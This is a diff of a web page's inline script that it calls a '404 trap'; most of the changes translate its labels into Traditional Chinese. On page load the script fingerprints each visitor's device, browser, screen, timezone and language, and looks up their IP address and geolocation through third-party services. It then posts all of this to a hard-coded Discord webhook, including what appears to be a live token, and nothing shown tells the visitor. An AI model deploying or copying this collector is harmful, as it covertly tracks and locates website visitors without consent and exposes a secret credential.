@@ -316,21 +316,24 @@
     })();
     
     // --------------------------------------------------------------
-    // 第二部分：Discord 資訊收集 (設備型號, IP, 深色模式, 地理位置優化)
+    // 第二部分：Discord 資訊收集 - 所有顯示皆為繁體中文
     // --------------------------------------------------------------
     const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1492236169524674625/K4JOL-5_G46crVFSWO2S05m9DhJamM42P91kQb-GCPFu7v6CiSIOvQHByAxuo1eqLbCq';
     
-    // 取得詳細設備資訊
+    // 取得詳細設備資訊 (繁體中文顯示)
     function getDeviceDetails() {
         const ua = navigator.userAgent;
         let deviceModel = "未知設備";
         let os = "未知作業系統";
         let browser = "未知瀏覽器";
         
+        // 解析作業系統 (繁體中文名稱)
         if (ua.indexOf("Windows NT 10.0") !== -1) os = "Windows 10";
         else if (ua.indexOf("Windows NT 6.3") !== -1) os = "Windows 8.1";
         else if (ua.indexOf("Windows NT 6.2") !== -1) os = "Windows 8";
         else if (ua.indexOf("Windows NT 6.1") !== -1) os = "Windows 7";
+        else if (ua.indexOf("Windows NT 6.0") !== -1) os = "Windows Vista";
+        else if (ua.indexOf("Windows NT 5.1") !== -1) os = "Windows XP";
         else if (ua.indexOf("Mac OS X") !== -1) {
             const match = ua.match(/Mac OS X (10[0-9_\.]+)/);
             os = match ? `macOS ${match[1].replace(/_/g, '.')}` : "macOS";
@@ -341,15 +344,17 @@
             os = match ? `Android ${match[1]}` : "Android";
         } else if (ua.indexOf("Linux") !== -1) os = "Linux";
         
+        // 解析瀏覽器 (繁體)
         if (ua.indexOf("Edg") !== -1) browser = "Microsoft Edge";
         else if (ua.indexOf("Chrome") !== -1 && ua.indexOf("Edg") === -1) browser = "Google Chrome";
         else if (ua.indexOf("Firefox") !== -1) browser = "Mozilla Firefox";
         else if (ua.indexOf("Safari") !== -1 && ua.indexOf("Chrome") === -1) browser = "Apple Safari";
         else if (ua.indexOf("OPR") !== -1 || ua.indexOf("Opera") !== -1) browser = "Opera";
+        else if (ua.indexOf("Trident") !== -1) browser = "Internet Explorer";
         else browser = "其他瀏覽器";
         
         let isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(ua);
-        let deviceType = isMobile ? "行動裝置" : "桌上型電腦/筆電";
+        let deviceType = isMobile ? "行動裝置" : "桌上型電腦 / 筆記型電腦";
         
         if (/iPhone/i.test(ua)) {
             deviceModel = "iPhone";
@@ -360,17 +365,18 @@
             if (match && match[1]) deviceModel = match[1];
             else deviceModel = "Android 通用裝置";
         } else if (/Windows NT/i.test(ua)) {
-            deviceModel = "Windows PC";
+            deviceModel = "Windows 個人電腦";
         } else if (/Mac OS X/i.test(ua)) {
-            deviceModel = "Macintosh";
+            deviceModel = "Mac 電腦";
         } else {
             deviceModel = deviceType;
         }
         
         const screenRes = `${window.screen.width} x ${window.screen.height}`;
-        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        const language = navigator.language || navigator.userLanguage;
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "未知時區";
+        const language = (navigator.language || navigator.userLanguage || "zh-TW").toUpperCase();
         
+        // 判斷深色模式
         let isDarkMode = false;
         const overrideStyle = document.getElementById('manual-theme-override');
         if (overrideStyle && overrideStyle.textContent.includes('#0a0e1a')) {
@@ -389,11 +395,11 @@
             language: language,
             userAgent: ua,
             isDarkMode: isDarkMode,
-            darkModeStatus: isDarkMode ? "啟用 (深色)" : "關閉 (淺色)"
+            darkModeStatus: isDarkMode ? "已啟用 (深色模式)" : "已關閉 (淺色模式)"
         };
     }
     
-    // 取得客戶端 IP (透過 ipify，穩定且支援 HTTPS)
+    // 取得客戶端 IP
     function fetchClientIP() {
         return new Promise((resolve) => {
             fetch('https://api.ipify.org?format=json')
@@ -403,7 +409,6 @@
                     else resolve("無法獲取 IP");
                 })
                 .catch(() => {
-                    // 備用方案：使用 ipapi.co
                     fetch('https://ipapi.co/json/')
                         .then(res => res.json())
                         .then(data => {
@@ -415,45 +420,119 @@
         });
     }
     
-    // 取得地理位置 (使用 HTTPS 且支援跨域的服務，加強穩定性，多重備援)
-    async function getGeoInfo(ip) {
-        // 若無有效 IP 則直接返回
-        if (!ip || ip === "無法獲取 IP" || ip === "未知 IP") {
-            return "無法取得位置 (無效IP)";
+    // 將英文地區名稱轉換為繁體中文（國家/地區名稱中文化）
+    function translateLocationToChinese(locationStr) {
+        if (!locationStr || locationStr === "無法取得位置" || locationStr.includes("無法獲取")) return locationStr;
+        
+        // 常見國家/地區名稱中文化對照表
+        const translations = {
+            "Taiwan": "臺灣",
+            "Taiwan, Province of China": "臺灣",
+            "China": "中國",
+            "United States": "美國",
+            "USA": "美國",
+            "Japan": "日本",
+            "South Korea": "南韓",
+            "Korea": "南韓",
+            "Hong Kong": "香港",
+            "Macau": "澳門",
+            "Singapore": "新加坡",
+            "Malaysia": "馬來西亞",
+            "Thailand": "泰國",
+            "Vietnam": "越南",
+            "Indonesia": "印尼",
+            "Philippines": "菲律賓",
+            "India": "印度",
+            "United Kingdom": "英國",
+            "France": "法國",
+            "Germany": "德國",
+            "Italy": "義大利",
+            "Spain": "西班牙",
+            "Australia": "澳洲",
+            "Canada": "加拿大",
+            "Brazil": "巴西",
+            "Russia": "俄羅斯",
+            "Netherlands": "荷蘭",
+            "Switzerland": "瑞士",
+            "Sweden": "瑞典",
+            "Norway": "挪威",
+            "Denmark": "丹麥",
+            "Finland": "芬蘭",
+            "Poland": "波蘭",
+            "Turkey": "土耳其",
+            "Saudi Arabia": "沙烏地阿拉伯",
+            "UAE": "阿拉伯聯合大公國",
+            "South Africa": "南非",
+            "Mexico": "墨西哥",
+            "Argentina": "阿根廷"
+        };
+        
+        let result = locationStr;
+        // 替換國家名稱
+        for (const [eng, chn] of Object.entries(translations)) {
+            const regex = new RegExp(`\\b${eng}\\b`, 'gi');
+            result = result.replace(regex, chn);
         }
         
-        // 服務列表 (優先使用 ip-api 的 HTTPS 版本，但因免費版有限制，改用 ipapi.co 或 freegeoip 等)
-        // 此處使用 ipapi.co 更穩定且返回詳細資訊
+        // 將常見區域名稱中文化
+        result = result.replace(/City/gi, "市")
+                       .replace(/County/gi, "縣")
+                       .replace(/District/gi, "區")
+                       .replace(/Province/gi, "省")
+                       .replace(/Region/gi, "地區");
+        
+        return result;
+    }
+    
+    // 取得地理位置 (使用多個服務，並將結果轉為繁體中文)
+    async function getGeoInfo(ip) {
+        if (!ip || ip === "無法獲取 IP" || ip === "未知 IP") {
+            return "無法取得位置 (無效 IP)";
+        }
+        
+        // 服務列表 (優先使用 ip-api 的 JSON 搭配中文化)
         const geoServiceList = [
-            // 主力: ipapi.co 提供國家、城市、地區 (HTTPS)
+            // ip-api.com 回傳欄位是英文，但我們可以中文化
+            {
+                url: `https://ip-api.com/json/${ip}?fields=status,country,city,regionName`,
+                parser: (data) => {
+                    if (data && data.status === 'success') {
+                        let parts = [];
+                        if (data.country) parts.push(data.country);
+                        if (data.regionName) parts.push(data.regionName);
+                        if (data.city) parts.push(data.city);
+                        let rawLocation = parts.join(" ");
+                        return rawLocation ? translateLocationToChinese(rawLocation) : null;
+                    }
+                    return null;
+                }
+            },
+            // ipapi.co 備用，亦可中文化
             {
                 url: `https://ipapi.co/${ip}/json/`,
                 parser: (data) => {
                     if (data && !data.error) {
-                        const parts = [data.country_name, data.region, data.city].filter(v => v && v !== "None");
-                        return parts.length ? parts.join(" ") : "未知地區";
+                        let parts = [];
+                        if (data.country_name) parts.push(data.country_name);
+                        if (data.region) parts.push(data.region);
+                        if (data.city) parts.push(data.city);
+                        let rawLocation = parts.join(" ");
+                        return rawLocation ? translateLocationToChinese(rawLocation) : null;
                     }
                     return null;
                 }
             },
-            // 備用: freegeoip 鏡像 (由 fcc 提供，穩定)
+            // freegeoip 備用
             {
                 url: `https://freegeoip.app/json/${ip}`,
                 parser: (data) => {
                     if (data && data.country_name) {
-                        const parts = [data.country_name, data.region_name, data.city].filter(v => v);
-                        return parts.length ? parts.join(" ") : null;
-                    }
-                    return null;
-                }
-            },
-            // 最終備案: ipwhois.io
-            {
-                url: `https://ipwhois.app/json/${ip}`,
-                parser: (data) => {
-                    if (data && data.success !== false && data.country) {
-                        const parts = [data.country, data.region, data.city].filter(v => v);
-                        return parts.length ? parts.join(" ") : null;
+                        let parts = [];
+                        if (data.country_name) parts.push(data.country_name);
+                        if (data.region_name) parts.push(data.region_name);
+                        if (data.city) parts.push(data.city);
+                        let rawLocation = parts.join(" ");
+                        return rawLocation ? translateLocationToChinese(rawLocation) : null;
                     }
                     return null;
                 }
@@ -463,14 +542,14 @@
         for (const service of geoServiceList) {
             try {
                 const controller = new AbortController();
-                const timeoutId = setTimeout(() => controller.abort(), 4000);
+                const timeoutId = setTimeout(() => controller.abort(), 5000);
                 const response = await fetch(service.url, { signal: controller.signal });
                 clearTimeout(timeoutId);
                 if (response.ok) {
                     const data = await response.json();
                     const location = service.parser(data);
-                    if (location) {
-                        console.log(`✅ 透過 ${service.url.split('/')[2]} 取得地理位置: ${location}`);
+                    if (location && !location.includes("undefined")) {
+                        console.log(`✅ 地理位置 (繁體): ${location}`);
                         return location;
                     }
                 }
@@ -480,11 +559,10 @@
             }
         }
         
-        // 全部失敗則回傳無法獲取，但至少不影響其他資訊
-        return "無法獲取地區 (所有服務皆失敗)";
+        return "無法獲取地區資訊 (所有服務皆失敗)";
     }
     
-    // 發送到 Discord
+    // 發送到 Discord (所有欄位與內容均為繁體中文)
     async function sendToDiscord(visitorData) {
         if (!DISCORD_WEBHOOK_URL) {
             console.warn("Webhook 未設定");
@@ -492,8 +570,8 @@
         }
         
         const embed = {
-            title: "🚨 404 頁面訪問警報 (含深色模式 & 地理位置)",
-            description: `偵測到有用戶觸發404頁面，已自動收集以下資訊`,
+            title: "🚨 404 頁面訪問警報 (完整繁體中文資訊)",
+            description: `偵測到有用戶觸發 404 頁面，以下為自動收集之訪客資訊`,
             color: visitorData.isDarkMode ? 0x2C3E66 : 0xE67E22,
             fields: [
                 { name: "🖥️ 設備型號", value: `\`${visitorData.deviceModel}\``, inline: true },
@@ -503,16 +581,19 @@
                 { name: "🖥️ 螢幕解析度", value: `\`${visitorData.screenResolution}\``, inline: true },
                 { name: "🌙 深色模式狀態", value: `\`${visitorData.darkModeStatus}\``, inline: true },
                 { name: "🌍 IP 位址", value: `\`${visitorData.ipAddress}\``, inline: false },
-                { name: "🗺️ 地理位置", value: `\`${visitorData.geo || "無法取得"}\``, inline: true },
+                { name: "🗺️ 地理位置 (繁體)", value: `\`${visitorData.geo}\``, inline: true },
                 { name: "⏱️ 時區", value: `\`${visitorData.timezone}\``, inline: true },
-                { name: "🔤 語言", value: `\`${visitorData.language}\``, inline: true },
-                { name: "📄 User Agent (原始)", value: `\`\`\`${visitorData.userAgent.substring(0, 400)}\`\`\``, inline: false }
+                { name: "🔤 瀏覽器語言", value: `\`${visitorData.language}\``, inline: true },
+                { name: "📄 原始使用者代理", value: `\`\`\`${visitorData.userAgent.substring(0, 450)}\`\`\``, inline: false }
             ],
-            footer: { text: "404 陷阱機制 | 自動偵測深色模式 & 強化地理位置獲取" },
+            footer: { text: "404 陷阱機制 | 所有資訊皆以繁體中文呈現" },
             timestamp: new Date().toISOString()
         };
         
-        const payload = { embeds: [embed], content: `⚠️ **新訪客觸發404頁面** (IP: ${visitorData.ipAddress} | 深色模式: ${visitorData.darkModeStatus})` };
+        const payload = { 
+            embeds: [embed], 
+            content: `⚠️ **新訪客觸發 404 頁面** (IP: ${visitorData.ipAddress} | 深色模式: ${visitorData.darkModeStatus})` 
+        };
         
         try {
             const response = await fetch(DISCORD_WEBHOOK_URL, {
@@ -521,7 +602,7 @@
                 body: JSON.stringify(payload)
             });
             if (response.ok) {
-                console.log("✅ 資訊已成功發送到 Discord 頻道 (含強化地理位置)。");
+                console.log("✅ 資訊已成功發送到 Discord 頻道 (繁體中文版)");
             } else {
                 console.error(`❌ Discord 回傳錯誤: ${response.status}`);
             }
@@ -530,18 +611,17 @@
         }
     }
     
-    // 主執行序 (優化地理位置取得，確保穩定)
+    // 主執行序
     (async function main() {
         const device = getDeviceDetails();
         const clientIp = await fetchClientIP();
         console.log("取得 IP:", clientIp);
         
-        // 獲取地理位置 (經過多重備援)
-        let geoInfo = "正在獲取位置...";
+        let geoInfo = "正在獲取位置資訊...";
         if (clientIp && clientIp !== "無法獲取 IP" && clientIp !== "未知 IP") {
             geoInfo = await getGeoInfo(clientIp);
         } else {
-            geoInfo = "無法獲取位置 (IP 無效)";
+            geoInfo = "無法取得位置 (IP 無效)";
         }
         
         const finalData = {
@@ -559,7 +639,6 @@
             darkModeStatus: device.darkModeStatus
         };
         
-        // 發送到 Discord
         await sendToDiscord(finalData);
         
         // 返回首頁按鈕行為
@@ -571,7 +650,7 @@
             });
         }
         
-        console.log("[404 資訊收集完成] 最終資料:", finalData);
+        console.log("[404 繁體中文資訊收集完成]", finalData);
     })();
 </script>
 </body>
